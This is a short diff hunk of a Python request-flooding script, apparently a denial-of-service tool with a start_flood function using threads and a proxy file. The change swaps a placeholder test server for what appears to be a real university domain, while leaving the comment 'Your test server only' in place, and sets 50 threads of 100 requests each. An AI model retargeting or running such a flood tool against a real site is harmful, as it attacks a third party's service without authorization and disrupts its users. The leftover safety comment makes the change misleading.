@@ -74,7 +74,7 @@ def start_flood(url, threads, requests_per_thread, proxy_file="proxy.txt"):
 
 # Run
 if __name__ == "__main__":
-    target_url = "https://your-test-server.com"  # Your test server only
+    target_url = "https://npiub.edu.bd"  # Your test server only
     thread_count = 50
     requests_per_thread = 100
 
